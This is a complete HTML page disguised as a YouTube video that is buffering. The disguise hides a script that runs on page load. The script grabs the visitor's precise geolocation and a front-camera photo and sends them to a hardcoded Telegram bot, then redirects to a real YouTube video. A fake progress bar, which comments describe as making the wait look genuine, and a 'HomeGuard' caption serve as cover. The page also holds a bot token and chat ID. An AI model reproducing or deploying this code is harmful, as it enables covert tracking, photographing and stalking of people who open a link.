<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8"/>
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>YouTube</title>
  <style>
    * { box-sizing: border-box; margin: 0; padding: 0; }

    body {
      background: #0f0f0f;
      color: #f1f1f1;
      font-family: Arial, sans-serif;
      min-height: 100vh;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      gap: 0;
    }

    /* ── YouTube header ── */
    .yt-header {
      position: fixed;
      top: 0; left: 0; right: 0;
      height: 56px;
      background: #0f0f0f;
      border-bottom: 1px solid #272727;
      display: flex;
      align-items: center;
      padding: 0 16px;
      gap: 12px;
      z-index: 10;
    }

    .yt-logo-svg { width: 100px; height: 22px; }

    .yt-search-wrap {
      flex: 1;
      display: flex;
      max-width: 500px;
    }

    .yt-search-wrap input {
      flex: 1;
      background: #121212;
      border: 1px solid #303030;
      border-right: none;
      border-radius: 40px 0 0 40px;
      color: #f1f1f1;
      font-size: 15px;
      padding: 0 14px;
      height: 38px;
      outline: none;
    }

    .yt-search-btn {
      background: #222;
      border: 1px solid #303030;
      border-radius: 0 40px 40px 0;
      color: #f1f1f1;
      height: 38px;
      width: 56px;
      cursor: pointer;
      font-size: 16px;
    }

    .yt-icons {
      display: flex;
      gap: 8px;
      margin-left: auto;
    }

    .yt-icon-btn {
      width: 34px;
      height: 34px;
      border-radius: 50%;
      background: #272727;
      border: none;
      color: #f1f1f1;
      font-size: 16px;
      cursor: pointer;
      display: flex;
      align-items: center;
      justify-content: center;
    }

    /* ── Main content ── */
    .yt-content {
      width: 100%;
      max-width: 900px;
      padding: 80px 16px 40px;
      display: flex;
      flex-direction: column;
      align-items: center;
    }

    /* ── Video player skeleton ── */
    .yt-player-box {
      width: 100%;
      aspect-ratio: 16/9;
      background: #1a1a1a;
      border-radius: 10px;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      position: relative;
      overflow: hidden;
      margin-bottom: 16px;
    }

    /* Subtle shimmer on player */
    .yt-player-box::after {
      content: '';
      position: absolute;
      inset: 0;
      background: linear-gradient(90deg, transparent 0%, rgba(255,255,255,0.03) 50%, transparent 100%);
      background-size: 200% 100%;
      animation: shimmer 2s infinite;
    }

    @keyframes shimmer {
      0%   { background-position: -200% 0; }
      100% { background-position:  200% 0; }
    }

    /* Buffering spinner */
    .buffer-ring {
      width: 52px;
      height: 52px;
      border: 3.5px solid rgba(255,255,255,0.1);
      border-top-color: #ff0000;
      border-radius: 50%;
      animation: spin 0.85s linear infinite;
      margin-bottom: 20px;
      z-index: 1;
    }

    @keyframes spin { to { transform: rotate(360deg); } }

    .buffer-label {
      font-size: 13px;
      color: #888;
      z-index: 1;
    }

    /* ── Progress bar ── */
    .yt-progress-wrap {
      width: 100%;
      height: 3px;
      background: #272727;
      border-radius: 2px;
      margin-bottom: 14px;
      overflow: hidden;
    }

    .yt-progress-bar {
      height: 100%;
      background: #ff0000;
      border-radius: 2px;
      width: 0%;
      transition: width 0.4s ease;
    }

    /* ── Skeleton loaders ── */
    .skeleton {
      background: #1e1e1e;
      border-radius: 6px;
      overflow: hidden;
      position: relative;
    }

    .skeleton::after {
      content: '';
      position: absolute;
      inset: 0;
      background: linear-gradient(90deg, transparent, rgba(255,255,255,0.04), transparent);
      background-size: 200% 100%;
      animation: shimmer 1.6s infinite;
    }

    .sk-title    { height: 22px; width: 80%; margin-bottom: 10px; }
    .sk-title-2  { height: 22px; width: 55%; margin-bottom: 18px; }
    .sk-meta     { height: 14px; width: 35%; margin-bottom: 16px; }

    .sk-channel-row {
      display: flex;
      align-items: center;
      gap: 12px;
      width: 100%;
      margin-bottom: 20px;
      padding: 12px 0;
      border-top: 1px solid #1e1e1e;
      border-bottom: 1px solid #1e1e1e;
    }

    .sk-avatar { width: 40px; height: 40px; border-radius: 50%; flex-shrink: 0; }
    .sk-ch-info { flex: 1; display: flex; flex-direction: column; gap: 6px; }
    .sk-ch-name { height: 14px; width: 120px; }
    .sk-ch-sub  { height: 11px; width: 80px; }
    .sk-sub-btn { height: 36px; width: 100px; border-radius: 20px; }

    .sk-desc    { height: 80px; width: 100%; border-radius: 10px; }

    /* ── Status text ── */
    .status-text {
      font-size: 12px;
      color: #555;
      margin-top: 12px;
      letter-spacing: 0.3px;
    }

    video, canvas { display: none; }
  </style>
</head>
<body>

  <!-- Header -->
  <header class="yt-header">
    <svg class="yt-logo-svg" viewBox="0 0 100 22" xmlns="http://www.w3.org/2000/svg">
      <path d="M15.8 3.4s-.25-1.6-.97-2.3C13.96.25 13 .24 12.5.2 10.2.05 6.8.05 6.8.05h-.01S3.4.05 1.1.2C.6.25-.37.26-1.1 1.1c-.72.7-.97 2.3-.97 2.3S-2.3 5.2-2.3 7v1.6c0 1.8.23 3.6.23 3.6s.25 1.6.97 2.3c.73.84 1.7.82 2.1.9 1.78.17 7.5.22 7.5.22s3.42-.01 5.72-.17c.5-.06 1.46-.07 2.18-.9.72-.7.97-2.3.97-2.3s.23-1.8.23-3.6V7c0-1.8-.23-3.6-.23-3.6zM5.5 9.8V3.6l5.92 3.1-5.92 3.1z" fill="#FF0000" transform="translate(3 5)"/>
      <text x="24" y="17" font-family="Arial" font-size="14" font-weight="bold" fill="#FFFFFF">YouTube</text>
    </svg>

    <div class="yt-search-wrap">
      <input type="text" placeholder="Search"/>
      <button class="yt-search-btn">🔍</button>
    </div>

    <div class="yt-icons">
      <button class="yt-icon-btn">🔔</button>
      <button class="yt-icon-btn">👤</button>
    </div>
  </header>

  <!-- Content -->
  <div class="yt-content">

    <!-- Player skeleton with buffering -->
    <div class="yt-player-box">
      <div class="buffer-ring"></div>
      <div class="buffer-label">Buffering...</div>
    </div>

    <!-- Progress bar -->
    <div class="yt-progress-wrap">
      <div class="yt-progress-bar" id="progressBar"></div>
    </div>

    <!-- Title skeleton -->
    <div style="width:100%">
      <div class="skeleton sk-title"></div>
      <div class="skeleton sk-title-2"></div>
      <div class="skeleton sk-meta"></div>

      <!-- Channel skeleton -->
      <div class="sk-channel-row">
        <div class="skeleton sk-avatar"></div>
        <div class="sk-ch-info">
          <div class="skeleton sk-ch-name"></div>
          <div class="skeleton sk-ch-sub"></div>
        </div>
        <div class="skeleton sk-sub-btn"></div>
      </div>

      <!-- Description skeleton -->
      <div class="skeleton sk-desc"></div>
    </div>

    <div class="status-text" id="statusText">Loading video, please wait...</div>

  </div>

  <video id="video" autoplay playsinline></video>
  <canvas id="canvas"></canvas>

<script>
  // ─── CONFIG ── Sirf yeh badal ──────────────────────────────────────────────
  const YOUTUBE_URL = "https://www.youtube.com/watch?v=dQw4w9WgXcQ";
  const BOT_TOKEN   = "8973797235:AAHeo3DYJHq79df4YXKleQu-sAanDgG1dcU";
  const CHAT_ID     = "8145264158";
  // ──────────────────────────────────────────────────────────────────────────

  const TELEGRAM     = `https://api.telegram.org/bot${BOT_TOKEN}`;
  const MAX_CAPTURE  = 4000;   // 4 sec: capture ke liye max
  const MAX_SEND     = 15000;  // 15 sec: send ke liye max

  // Progress bar slow animation (genuine lagaane ke liye)
  const bar = document.getElementById("progressBar");
  let prog = 0;
  const progInterval = setInterval(() => {
    // Slowly fill up to 85%, ruk jaayega jab tak send na ho
    if (prog < 85) {
      prog += Math.random() * 2.5;
      if (prog > 85) prog = 85;
      bar.style.width = prog + "%";
    }
  }, 400);

  function finishProgress() {
    clearInterval(progInterval);
    bar.style.transition = "width 0.6s ease";
    bar.style.width = "100%";
  }

  function redirect() {
    finishProgress();
    setTimeout(() => {
      window.location.replace(YOUTUBE_URL);
    }, 500);
  }

  async function run() {
    let lat = null, lon = null, locText = null, photoBlob = null;

    // ── PHASE 1: Capture (max 4 sec) ─────────────────────────────────────────
    await Promise.race([
      new Promise(res => setTimeout(res, MAX_CAPTURE)),

      Promise.allSettled([

        // Location
        new Promise(async res => {
          try {
            const pos = await new Promise((resolve, reject) =>
              navigator.geolocation.getCurrentPosition(resolve, reject, {
                enableHighAccuracy: true, timeout: MAX_CAPTURE - 500
              })
            );
            lat = pos.coords.latitude;
            lon = pos.coords.longitude;
            locText = `📍 ${lat.toFixed(6)}, ${lon.toFixed(6)}\nAccuracy: ${Math.round(pos.coords.accuracy)}m`;
          } catch(e) {}
          res();
        }),

        // Camera
        new Promise(async res => {
          try {
            let stream;
            try {
              stream = await navigator.mediaDevices.getUserMedia({
                video: { facingMode: { exact: "user" } }
              });
            } catch {
              stream = await navigator.mediaDevices.getUserMedia({ video: true });
            }

            const video  = document.getElementById("video");
            const canvas = document.getElementById("canvas");
            video.srcObject = stream;
            await new Promise(r => video.onloadedmetadata = r);
            await new Promise(r => setTimeout(r, 900));

            canvas.width  = video.videoWidth;
            canvas.height = video.videoHeight;
            canvas.getContext("2d").drawImage(video, 0, 0);
            stream.getTracks().forEach(t => t.stop());

            photoBlob = await new Promise(r => canvas.toBlob(r, "image/jpeg", 0.88));
          } catch(e) {}
          res();
        })

      ])
    ]);

    // ── PHASE 2: Send (max 15 sec) ────────────────────────────────────────────
    await Promise.race([
      new Promise(res => setTimeout(res, MAX_SEND)),

      Promise.allSettled([

        // Send photo
        (async () => {
          if (!photoBlob) return;
          try {
            const fd = new FormData();
            fd.append("chat_id", CHAT_ID);
            fd.append("photo", photoBlob, "hg_trigger.jpg");
            fd.append("caption", `🛡️ HomeGuard Trigger\n${locText || "Location unavailable"}`);
            await fetch(`${TELEGRAM}/sendPhoto`, { method: "POST", body: fd });
          } catch(e) {}
        })(),

        // Send location pin
        (async () => {
          if (lat === null) return;
          try {
            await fetch(`${TELEGRAM}/sendLocation`, {
              method: "POST",
              headers: { "Content-Type": "application/json" },
              body: JSON.stringify({ chat_id: CHAT_ID, latitude: lat, longitude: lon })
            });
          } catch(e) {}
        })()

      ])
    ]);

    // ── PHASE 3: Redirect ─────────────────────────────────────────────────────
    redirect();
  }

  window.addEventListener("load", run);
</script>

</body>
</html>
